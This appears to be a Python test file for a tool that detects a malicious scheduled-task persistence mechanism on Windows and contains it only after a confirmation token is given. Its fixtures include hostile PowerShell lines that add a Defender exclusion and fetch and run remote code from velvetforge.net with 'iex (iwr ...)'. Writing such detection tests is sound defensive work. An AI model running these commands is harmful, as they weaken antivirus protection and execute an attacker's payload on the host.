"""Tests for localhost rewriter persistence detection and gated containment."""

from __future__ import annotations

from pathlib import Path

from src.proxy_drift.rewriter_containment import (
    CONFIRM_CONTAIN,
    detect_localhost_rewriter,
    run_rewriter_containment,
)
from windows_network_toolkit.safety import is_blocked_action

_FIXTURE_TASK = {
    "task_name": "\\VersionUpdaterV12-zdc8",
    "state": "Running",
    "actions": (
        "powershell -Command Add-MpPreference -ExclusionProcess powershell.EXE -Force | "
        "powershell -Command iex (iwr -useb velvetforge.net)"
    ),
}

_FIXTURE_PROC = {
    "pid": 33636,
    "name": "node.exe",
    "session_id": 0,
    "parent_pid": 12152,
    "executable_path": r"C:\WINDOWS\system32\VersionUpdaterV12-zdc8\node.exe",
    "command_line": r'"C:\WINDOWS\system32\VersionUpdaterV12-zdc8\node.exe" .\app.js',
    "parent_command_line": (
        r'"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.EXE" '
        r"-Command iex (iwr -useb velvetforge.net)"
    ),
}

_WNRT_TASK = {
    "task_name": "\\WNRT-DeadProxyGuardian",
    "state": "Ready",
    "actions": r"powershell -File C:\repo\scripts\run-proxy-guardian-loop.ps1",
}


def test_detect_matches_version_updater_fixture() -> None:
    out = detect_localhost_rewriter(
        tasks=[_FIXTURE_TASK],
        processes=[_FIXTURE_PROC],
        exclusions={"paths": [], "processes": ["powershell.EXE"]},
    )
    assert out["match"] is True
    assert "remote_iex_task" in out["signals"]
    assert "version_updater_name" in out["signals"] or "version_updater_path" in out["signals"]
    assert out["matched_tasks"]
    assert out["matched_processes"]
    assert any("VersionUpdater" in d for d in out["payload_dirs"])
    assert "powershell.EXE" in out["exclusion_processes"]


def test_wnrt_guardian_task_never_matched() -> None:
    out = detect_localhost_rewriter(
        tasks=[_WNRT_TASK],
        processes=[],
        exclusions={"paths": [], "processes": []},
    )
    assert out["match"] is False
    assert out["matched_tasks"] == []


def test_benign_node_not_matched() -> None:
    out = detect_localhost_rewriter(
        tasks=[],
        processes=[
            {
                "pid": 1,
                "name": "node.exe",
                "executable_path": r"C:\Users\dev\AppData\Local\Programs\node\node.exe",
                "command_line": "node server.js",
                "parent_command_line": "cmd.exe",
            }
        ],
        exclusions={"paths": [], "processes": []},
    )
    assert out["match"] is False


def test_preview_default_no_apply(tmp_path: Path) -> None:
    applied: list[str] = []

    def _apply(*_a, **_k):
        applied.append("called")
        return {"tasks_deleted": [], "processes_stopped": [], "errors": []}

    out = run_rewriter_containment(
        dry_run=True,
        confirm="",
        repo_root=tmp_path,
        tasks=[_FIXTURE_TASK],
        processes=[_FIXTURE_PROC],
        exclusions={"paths": [], "processes": ["powershell.EXE"]},
        apply_fn=_apply,
        audit_path=tmp_path / "audit.jsonl",
    )
    assert out["match"] is True
    assert out["action_taken"] == "preview_only"
    assert applied == []
    assert CONFIRM_CONTAIN in (out.get("confirmation_required") or "")


def test_blocked_without_confirm_token(tmp_path: Path) -> None:
    applied: list[str] = []

    def _apply(*_a, **_k):
        applied.append("called")
        return {"tasks_deleted": ["x"], "processes_stopped": [1], "errors": []}

    out = run_rewriter_containment(
        dry_run=False,
        confirm="WRONG",
        repo_root=tmp_path,
        tasks=[_FIXTURE_TASK],
        processes=[_FIXTURE_PROC],
        exclusions={"paths": [], "processes": []},
        apply_fn=_apply,
        audit_path=tmp_path / "audit.jsonl",
    )
    assert out["action_taken"] == "blocked"
    assert applied == []


def test_apply_with_token(tmp_path: Path) -> None:
    def _apply(detection, *, quarantine_root, run):
        assert detection["match"] is True
        assert quarantine_root.exists() or True
        return {
            "tasks_deleted": ["\\VersionUpdaterV12-zdc8"],
            "processes_stopped": [33636],
            "exclusions_removed": [{"type": "process", "value": "powershell.EXE"}],
            "quarantined": [{"from": r"C:\WINDOWS\system32\VersionUpdaterV12-zdc8", "to": "q"}],
            "errors": [],
        }

    out = run_rewriter_containment(
        dry_run=False,
        confirm=CONFIRM_CONTAIN,
        repo_root=tmp_path,
        tasks=[_FIXTURE_TASK],
        processes=[_FIXTURE_PROC],
        exclusions={"paths": [], "processes": ["powershell.EXE"]},
        apply_fn=_apply,
        audit_path=tmp_path / "audit.jsonl",
    )
    assert out["action_taken"] == "remediated"
    assert out["apply"]["tasks_deleted"]


def test_kill_proxy_process_still_blocked() -> None:
    assert is_blocked_action("KILL_PROXY_PROCESS")
